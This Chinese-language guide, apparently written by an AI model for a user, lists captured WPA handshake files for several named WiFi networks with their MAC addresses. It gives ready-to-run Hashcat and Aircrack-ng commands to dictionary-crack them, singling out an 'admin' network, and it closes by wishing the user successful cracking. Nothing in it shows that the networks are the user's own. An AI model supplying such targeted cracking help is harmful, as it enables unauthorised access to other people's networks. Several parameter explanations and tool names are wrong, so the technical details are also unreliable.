握手包文件说明及Windows字典攻击指南
===================================

你已经成功整理了以下握手包文件：

1. cleaned.cap
2. complete_handshake.cap
3. complete_handshake_pcap.cap
4. eapol_only.cap
5. handshake_BTWIFI8047_88-5A-02-C5-80-47_2025-12-30T13-18-17.cap
6. handshake_BTWIFI8047.hccap
7. handshake_MiFiFFF2_28-15-A4-02-FF-F2_2025-12-30T13-16-34.cap
8. handshake_admin_5C-A0-00-F5-77-FA_2026-01-14T21-53-38.cap (今天抓取的admin网络)
9. handshake_admin.hccap (今天抓取的admin网络)
10. handshake_admin.hc22000 (今天抓取的admin网络)
11. handshake_BTWIFI7793_74-5A-7A-64-77-93_2026-01-14T21-40-54.cap (今天抓取的BTWIFI7793网络)

特别注意：第8-10个文件是今天（2026年1月14日）抓取的名为"admin"的WiFi网络握手包，这是您要找的目标文件。

附加文件：
- essid.txt: 包含捕获的ESSID信息
- handshake_files.zip: 包含所有握手包文件的压缩包，便于传输

在Windows上使用ARC A310和AMD 3400G进行字典攻击的方法：

方法一：使用Hashcat（推荐，可利用GPU加速）
1. 下载并安装Hashcat（https://hashcat.net/hashcat/）
2. 安装Intel或AMD显卡驱动（确保支持OpenCL）
3. 解压handshake_files.zip，获取握手包文件
4. 准备字典文件（如rockyou.txt等）
5. 使用以下命令进行攻击：
   hashcat.exe -m 2500 handshake_admin.hccap -w 3 -d 1 wordlist.txt
   或者对于.cap文件：
   hashcat.exe -m 2501 handshake_admin_5C-A0-00-F5-77-FA_2026-01-14T21-53-38.cap -w 3 -d 1 wordlist.txt
   或者对于.hc22000文件：
   hashcat.exe -m 22000 handshake_admin.hc22000 -w 3 -d 1 wordlist.txt

   参数说明：
   -m 2500: WPA/WPA2 HCCAP格式
   -m 2501: WPA/WPA2 PMKID+CAP格式
   -m 22000: WPA-PBKDF2-PMKID+EAPOL格式
   -w 3: 高温模式，适合性能优先
   -d 1: 指定GPU设备（如果需要）

方法二：使用Aircrack-ng Windows版
1. 下载Aircrack-ng Windows版
2. 使用命令：aircrack-ng-gpu.exe -w wordlist.txt -b 5C:A0:00:F5:77:FA handshake_admin_5C-A0-00-F5-77-FA_2026-01-14T21-53-38.cap

注意事项：
- .hccap格式是Hashcat专用格式（-m 2500）
- .hc22000格式是Hashcat新版格式（-m 22000）
- .cap是标准pcap格式，可被多种工具使用
- 你的ARC A310虽然是一款入门级显卡，但配合AMD 3400G的集成显卡，仍可通过OpenCL实现GPU加速
- 确保安装了最新的Intel和AMD显卡驱动以获得最佳性能
- 建议先用小字典测试以验证握手包有效性
- 如果使用双显卡系统，可以在Hashcat中指定使用哪个GPU或同时使用两个GPU

祝你在Windows上破解成功！